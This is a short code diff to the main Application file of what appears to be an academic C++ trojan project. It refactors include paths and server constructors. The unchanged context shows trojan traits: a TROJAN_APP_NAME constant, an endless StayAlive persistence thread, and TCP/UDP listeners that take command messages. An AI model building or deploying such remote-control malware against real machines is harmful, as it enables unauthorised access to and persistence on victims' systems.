@@ -1,15 +1,18 @@
+// This is a personal academic project. Dear PVS-Studio, please check it.
+// PVS-Studio Static Code Analyzer for C, C++ and C#: http://www.viva64.com
+
 #include "..\Service\pch.hpp"
 
 #include "Application.hpp"
-#include "..\Network\TCPServer.hpp"
+#include "..\Network\TCP\TCPServer.hpp"
 #include "..\Network\Protocols\CommandMessageProtocol.hpp"
 #include "..\Service\Debugger.hpp"
 #include "..\Service\Tools.hpp"
-#include "..\Network\UDPServer.hpp"
+#include "..\Network\UDP\UDPServer.hpp"
 
 Application::Application() :
 	m_io(),
-	m_tcp_server(new TCPServer(m_io, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), std::atoi(DEFAULT_PORT)))),
+	m_tcp_server(new TCPServer(m_io, std::atoi(DEFAULT_PORT))),
 	m_udp_server(new UDPServer(m_io, std::atoi(DEFAULT_PORT))),
 	m_thread([this]() { m_io.run(); }),
 	m_save_thread([]() { for (;;) { StayAlive(TROJAN_APP_NAME); } })
@@ -17,7 +20,7 @@ Application::Application() :
 
 Application::Application(char *argv[]) :
 	m_io(),
-	m_tcp_server(new TCPServer(m_io, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), std::atoi(argv[1])))),
+	m_tcp_server(new TCPServer(m_io, std::atoi(argv[1]))),
 	m_udp_server(new UDPServer(m_io, std::atoi(argv[1]))),
 	m_thread([this]() { m_io.run(); }),
 	m_save_thread([]() { for (;;) { StayAlive(TROJAN_APP_NAME); } })
@@ -31,7 +34,7 @@ Application::~Application()
 
 void Application::run()
 {
-	char line[CMPROTO::MAX_BODY_LENGTH + 1] = "";
+	char line[CMPROTO::MAX_BODY_LENGTH + 1]{ };
 	while (std::cin.getline(line, CMPROTO::MAX_BODY_LENGTH + 1))
 	{
 		CMPROTO msg;
